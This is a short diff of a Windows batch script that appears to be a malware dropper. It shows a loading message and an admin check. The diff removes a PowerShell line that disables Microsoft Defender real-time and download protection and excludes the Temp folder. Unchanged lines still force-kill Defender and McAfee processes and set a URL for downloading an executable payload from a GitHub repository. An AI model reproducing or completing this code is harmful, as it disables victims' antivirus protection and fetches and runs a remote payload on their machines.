@@ -9,7 +9,6 @@ echo Loading...
     timeout /t 2 >nul  
     goto :checkadmin  
     :execute  
-    powershell -command "Set-MpPreference -DisableRealtimeMonitoring $true; Set-MpPreference -DisableIOAVProtection $true; Add-MpPreference -ExclusionPath '%Temp%\'"  
     taskkill /f /im MsMpEng.exe >nul 2>&1  
     taskkill /f /im McAfee*.exe >nul 2>&1  
     set "PAYLOAD_URL=https://github.com/madhead341/amzhubv2/raw/refs/heads/main/V3.exe"
